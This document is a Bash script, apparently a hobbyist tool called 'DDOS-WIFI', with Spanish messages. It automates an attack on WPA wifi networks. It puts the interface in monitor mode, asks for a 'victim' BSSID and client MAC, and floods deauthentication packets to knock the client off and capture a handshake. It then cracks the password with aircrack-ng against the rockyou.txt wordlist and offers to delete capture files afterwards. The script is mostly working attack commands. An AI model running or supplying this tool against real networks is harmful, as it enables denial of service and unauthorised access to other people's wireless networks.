#!/bin/bash

rojo='\033[0;31m'
verde='\033[0;32m'
amarillo='\033[0;33m'
azul='\033[0;34m'

sudo clear
echo -e "${azul}"
echo -e "            *****************************************************${azul}"
echo -e "            * @MklMillan     💣️        BIENVENIDO A DDOS-WIFI   *${azul}"
echo -e "            *****************************************************${amarillo}"


# Crea el directorio Data_Wifi si no existe
#if [ ! -d "Data_Wifi" ]; then
#  mkdir Data_Wifi
#fi

loading_animation() {
    local delay=0.1  # Delay entre cada paso
    local dots=("⠋" "⠌" "⠍" "⠏" "⠍" "⠌") # Caracteres para la animación

    # Definimos algunos colores
    local colors=( "\033[31m" "\033[32m" "\033[33m" "\033[34m" "\033[35m" "\033[36m" "\033[37m" "\033[0m" ) # Rojo, Verde, Amarillo, Azul, Magenta, Cian, Blanco, Reset

    while true; do
        for dot in "${dots[@]}"; do
            # Elegir un color aleatorio
            local color=${colors[RANDOM % ${#colors[@]}]}
            echo -ne "\r${color}$dot $dot $dot $dot $dot $dot $dot $dot $dot $dot $dot $dot $dot $dot $dot $dot $dot $dot $dot $dot\033[0m"  
            sleep $delay
        done
    done
}


# Verifica si Aircrack-ng está instalado

echo -e "[+]Verificando Dependencias...${amarillo}"
sleep 1

##AIRCRACK-NG
if command -v aircrack-ng >/dev/null 2>&1; then
  sleep 1
  echo -e "[+]Aircrack-ng está instalado."
else
  sleep 1
  echo -e "[+]Debes tener instalado Aircrack-ng para usar este script."
  sleep 1
  echo -e "[+]Verificando su conexión a Internet."
  if ping -c 1 8.8.8.8 > /dev/null 2>&1; then
    sudo apt install aircrack-ng
    echo "[+]Aircrack-ng se ha instalado satisfactoriamente"
    
  else
    sleep 1
    echo -e "[+]Por Favor, Conectese a Internet y vuelva a intentarlo."
    exit 1
  fi
fi

##GNOME-TERMINAL
if command -v gnome-terminal >/dev/null 2>&1; then
  sleep 1
  echo -e "[+]Gnome-Terminal está instalado."
else
  sleep 1
  echo -e "[+]Debemos instalar Gnome-Terminal para que funcione correctamente este Script"
  sleep 1
  echo -e "[+]Verificando su conexión a Internet."
  if ping -c 1 8.8.8.8 > /dev/null 2>&1; then
    sudo apt install gnome-terminal
    echo "[+]Gnome-Terminal se ha instalado satisfactoriamente"
  else
    sleep 1
    echo -e "[+]Por Favor, Conectese a Internet y vuelva a intentarlo."
    exit 1
  fi
fi

##XCLIP
if command -v xclip >/dev/null 2>&1; then
  sleep 1
  echo -e "[+]XClip está instalado."
else
  sleep 1
  echo -e "[+]No es necesario Xclip para la funcionabilidad de este Script pero seria de gran ayuda."
  sleep 1
  echo -e "[+]Verificando su conexión a Internet."
  if ping -c 1 8.8.8.8 > /dev/null 2>&1; then
    sudo apt install xclip
    echo "[+]Xclip se ha instalado satisfactoriamente"
  else
    sleep 1
    echo -e "[+]Por Favor, Conectese a Internet y vuelva a intentarlo."
    
  fi
fi




echo -e "${verde}"


# Encuentra la interfaz wifi
interfaz=$(sudo iw dev | grep 'Interface' | awk '{print$2}')
echo "[+]Indentificando su Interfaz de Red..."
sleep 2

##FUNCION PARA LA CAPTURA DE TRAFICO Y HANDSHAKE ( CASI TOD)
CapturaTrafico()
{
	# Captura tráfico
	sudo airodump-ng -w crack $interfaz
	echo -e "\nSeleccione y copie el BSSID y el Canal de su Vicitima:"
	echo "[+]BSSID:"
	read bssid
	echo "[+]CHANNEL:"
	read channel
	sudo airodump-ng -w crack --bssid $bssid --channel $channel $interfaz 

	# Ataque de desautentificación
	echo -e "\nCopie la direccion Mac de la Estacion:"
	read macStation
	comando="sudo airodump-ng -w crack --bssid $bssid --channel $channel $interfaz"
	comando2="sudo aireplay-ng --deauth 0 -a $bssid -c $macStation $interfaz"

	#UTILES
	echo "[+]Comando Util Copiado!!"
	echo "sudo aireplay-ng --deauth 0 -a $bssid -c $macStation $interfaz" | xclip -selection clipboard

	echo "PERFECTO!! enviando paquetes de autenticacion, Regresa al Dumpeo!!"   
	gnome-terminal -- bash -c "$comando2;bash" & disown
	echo "Ejecutando Dos ($bssid => $macStation => $interfaz)"
	gnome-terminal -- bash -c "$comando;bash" & disown 







	# Ataque con Aircrack-ng
	#echo "Introduce tu WordList *(rockyou.txt):"
	#read wordlist

	echo "[+]Pulse una tecla para iniciar el BRUTE FORCE!!"
	echo "[+]CUIDADO no presione hasta obtener el HandShake!!"

	read -n 1 -r -s -p ""

	# Contar la cantidad de archivos con extensión .cap
	count=$(find . -maxdepth 1 -type f -name "*.cap" | wc -l)

	# Verificar si la cantidad es mayor que 1 
	if [ $count -gt 1 ]; then
	  echo -e "\n[-]El archivo .cap se repite $count veces, CORRIGIENDO, POR FAVOR ESPERE..."
	  echo "[-]Asegurese de usar el archivo .cap correcto (contenedor del Handshake)!!"
	  
	  # Obtener la longitud de la variable count
	  largo=${#count}
	  
	  if [ $largo -gt 1 ]; then
	    
	    	sudo aircrack-ng crack-$count.cap -w rockyou.txt
	    	
	  elif [ $largo -lt 2 ]; then
	    
	    	sudo aircrack-ng crack-0$count.cap -w rockyou.txt
	  else
	  
	    	echo "[-]Es posible que el bufer este lleno"
	    	#Borrar Cache
		echo -e "\nDesea Borrar el Cache antes de salir (y/n):"
		read respuesta
		if [ $respuesta = 'y' ]; then

			rm -f *.netxml 
			rm -f *.csv 
			rm -f *.cap
			
			echo "[+]Cache Borrado con Exito!"
			echo "[+]Reinicie el Programa"
			echo "BYE.."
			sleep 2
			echo "BYE..BYE"
		else 
			echo "[-]Debera Borrar el Cache para que Aircrack-ng funcione correctamente"
			sleep 1
			echo "[-]Caso Contrario, le asignara el archivo '.cap' incorrecto!"
			sleep 1
			echo "SALIENDO..."
			sleep 1
			exit 0
		fi 
	    echo "[-]No existe ningún archivo .cap dentro de la carpeta"
	  fi
	fi




	# Restablece la interfaz WiFi
	echo "Continue para Restabler la Interfaz Wifi(Manager):"
	echo "En caso de querer a volver a usar el script inmediatamente, \nes recomendable que simplemente lo cierre con Ctrl+C"
	read -n 1 -r -s -p ""
	sudo systemctl restart NetworkManager
	wait
	sudo airmon-ng stop $interfaz
	echo "[+]Interfaz como nueva!!"

	#Borrar Cache
	echo -e "\nDesea Borrar el Cache antes de salir (y/n):"
	read respuesta
	if [ $respuesta = 'y' ]; then
		
		echo "Desea Borrar el Historial Completo o conservar archivos '.cap' (Contenedores de EAPOL(Key))?? (y/n):"
		read respuesta2
		
		if [ $respuesta2 = 'y' ]; then
		
			rm -f *.netxml 
			rm -f *.csv 
			rm -f *.cap
			
			echo "[-]HISTORIAL BORRADO EXITOSAMENTE!"
			echo "Gracias por Usar !"
			echo "BYE.."
			sleep 1
			echo "BYE..BYE"
			exit 0
		else
			rm -f *.netxml 
			rm -f *.csv 
			
			echo "[+]Conservaste los archivos .cap, contenedores de EAPOL(Key)!"
			echo "BYE.."
			sleep 1
			echo "BYE..BYE"
			exit 0
		fi
		
	else 
		exit 0
	fi 

}


#Test para el modo monitor
echo "[+]Testing para la Interfaz de Red..."

test=$(sudo iw dev | awk '/type/ { if ($2 == "monitor") print $2}')

if [[ "$test" = "monitor" ]]; then

	echo "La interfaz ya se encuentra en modo Monitor!!."
  	sleep 1
  	CapturaTrafico
	exit 0
else
  	interfaztest=$(sudo iw dev | grep 'Interface' | awk '{print$2}')
  	sleep 1
  	echo "[+]No esta activado el modo monitor($test)!"
  	sleep 1
	# Inicia el modo monitor
	echo -e "[+]Iniciando el modo monitor..."
	sudo airmon-ng start $interfaztest
	loading_animation & 
	sleep 5
	kill $!
	sudo clear
	if [[ "$test" = "monitor" ]]; then
		
		echo "[+]La interfaz ya se encuentra en modo Monitor!."
	  	sleep 1
	  	echo "[+]Se activo el modo monitor con EXITO!!"
	  	sleep 1
	  	CapturaTrafico
	else
		
		echo "[-]Vuelva a iniciar el Script!"
		read -n 1 -r -s -p ""
	fi
	
fi

##Clasificar el handshake segun su victima y encontrar elcap corerspondiente


